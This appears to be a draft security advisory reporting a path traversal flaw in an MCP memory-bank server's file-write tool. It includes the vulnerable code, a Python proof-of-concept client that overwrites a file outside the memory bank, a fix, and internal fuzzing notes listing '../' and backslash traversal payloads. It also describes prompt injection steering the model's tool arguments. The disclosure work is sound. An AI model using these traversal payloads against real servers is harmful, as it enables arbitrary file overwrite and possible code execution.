# Path traversal in `write_memory_bank_file`: `filename` can create or overwrite files outside the memory bank

**Repository:** `movibe/memory-bank-mcp` · **Tool:** `write_memory_bank_file` · **Tested commit:** `7851e06`
**Weakness:** CWE-22 Path Traversal

## Summary
`write_memory_bank_file` is meant to write one file inside the active `memory-bank/` directory. The `filename` argument is joined onto that directory with `path.join` and written with `fs.writeFile` without a containment check, so a `../` path creates or overwrites any file the server process can write, with caller-chosen content.

## Details
The handler passes `filename` and `content` through unchanged (`src/server/tools/index.ts:117-127`, `src/server/tools/CoreTools.ts:326`) to `MemoryBankManager.writeFile` (`src/core/MemoryBankManager.ts:308-315`):

```ts
async writeFile(filename: string, content: string): Promise<void> {
  try {
    if (!this.memoryBankDir) {
      throw new Error('Memory Bank directory not set');
    }
    const filePath = path.join(this.memoryBankDir, filename);
    await FileUtils.writeFile(filePath, content);
```

`FileUtils.writeFile` is a plain `fs.writeFile` (`src/utils/FileUtils.ts:68-70`), which replaces an existing file. `path.join` resolves `..` segments, and nothing checks that the result stays under `this.memoryBankDir`. The only limit is that the parent directory must already exist, since `fs.writeFile` does not create it.

## Steps to reproduce
1. Prerequisites: Node.js 18+ and Python with the `mcp` package. Create a project directory and a marker file outside it:
   ```bash
   mkdir -p /tmp/tofu-poc/project
   echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Start the server as the README describes (`npx @movibe/memory-bank-mcp`; the tested commit is the 0.4.1 release commit), with `/tmp/tofu-poc/project` as the working directory. From a source checkout: `bun install && bun run build`, then `node build/index.js`.
3. Create the memory bank inside the project (`/tmp/tofu-poc/project/memory-bank`), then write through `../../`:

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="npx",
           args=["-y", "@movibe/memory-bank-mcp@0.4.1", "--path", "/tmp/tofu-poc/project"],
           cwd="/tmp/tofu-poc/project",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               await session.call_tool("initialize_memory_bank", {"path": "/tmp/tofu-poc/project"})
               print(await session.call_tool("write_memory_bank_file", {
                   "filename": "../../outside.txt",
                   "content": "overwritten by write_memory_bank_file\n",
               }))
               print(await session.call_tool("write_memory_bank_file", {
                   "filename": "../../new.txt",
                   "content": "created by write_memory_bank_file\n",
               }))

   asyncio.run(main())
   ```
4. Observe: `cat /tmp/tofu-poc/outside.txt` prints `overwritten by write_memory_bank_file` instead of `marker`, and `/tmp/tofu-poc/new.txt` now exists. Both are outside `/tmp/tofu-poc/project/memory-bank`.

## Expected behavior
The tool rejects any `filename` that resolves outside the memory bank directory and leaves files outside it untouched.

## Actual behavior
Both writes succeed and the tool replies `File ../../outside.txt successfully written to Memory Bank` (and the same for `new.txt`).

## Impact
In MCP the model chooses tool arguments, and prompt injection in content the model reads can steer it. A `../` filename lets an attacker write arbitrary content to any path the server user can write: shell startup files, project source, CI or editor configuration, or other projects' files. Depending on what is overwritten, this can lead to code execution the next time that file is used. It is an arbitrary file write with the server user's privileges.

## Suggested fix
Resolve the target and require it to stay under the memory bank directory before writing:

```ts
const root = path.resolve(this.memoryBankDir);
const filePath = path.resolve(root, filename);
const rel = path.relative(root, filePath);
if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) {
  throw new Error(`Invalid filename: ${filename}`);
}
```

Use the same helper in `readFile`. Optionally restrict `filename` to a plain basename ending in `.md`, since `list_memory_bank_files` only shows `.md` files in the top-level directory anyway.

## Status on the default branch
Still present at `7851e06` (2025-03-17). The default branch has no commits after the tested one.

## Prior reports
- No issue or PR reports this. Searched all 1 issue and 9 pull requests (fetched 2026-10-01); none mentions `filename` validation, path traversal, `readFile`/`writeFile` containment or any security problem. PRs #6 and #8 describe initialization and logging changes only; `writeFile` on the default branch still has no containment check.
- Documentation: docs/cline-integration.md, "Security Considerations": "UMB mode allows temporary file modifications, but only for files within the Memory Bank" (states the intended confinement that `write_memory_bank_file` does not enforce).
- Documentation: docs/mcp-protocol-specification.md: "Writes to a Memory Bank file" with "`filename`: Name of the file to write" (documented contract is a file inside the memory bank).
- Documentation: docs/requirements.md (a copy of the MCP documentation kept in the repo): "Sanitize file paths to prevent directory traversal" (general guidance; the server does not follow it here).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal; `check_path_traversal` (also `check_reflected_output` fired for this tool, because `filename` is echoed in the reply).
- Campaigns and executions: corpus-sbx 512 exec / 114 success; e2-0922 512 / 184.
- Evidence (verbatim, trimmed):
  - `{'filename': '..\\..\\..\\..\\windows\\win.ini', 'content': 'test content for windows path traversal'}` -> `File ..\\..\\..\\..\\windows\\win.ini successfully written to Memory Bank`
  - `{'filename': '"filename": "memory_bank.txt"cotent": "../../"memory_bank.txt", "me"', 'content': ''}` -> `File "filename": ... successfully written to Memory Bank`
- Hand-check hints: real by code, weak evidence. The sink is clear: `filename` reaches `fs.writeFile` through `path.join` with no containment (`MemoryBankManager.ts:314-315`), the same pattern as `readFile`, whose traversal ToFu confirmed with a real out-of-root read. But none of the three logged write inputs escaped the memory bank: backslashes are literal on Linux (file named `..\..\..\..\windows\win.ini` created inside the bank), and the quoted-JSON filename normalises back inside the bank (`seg/../x` -> `x`). The out-of-root write in the reproduction is derived from code, not from a log. Not run.
</details>
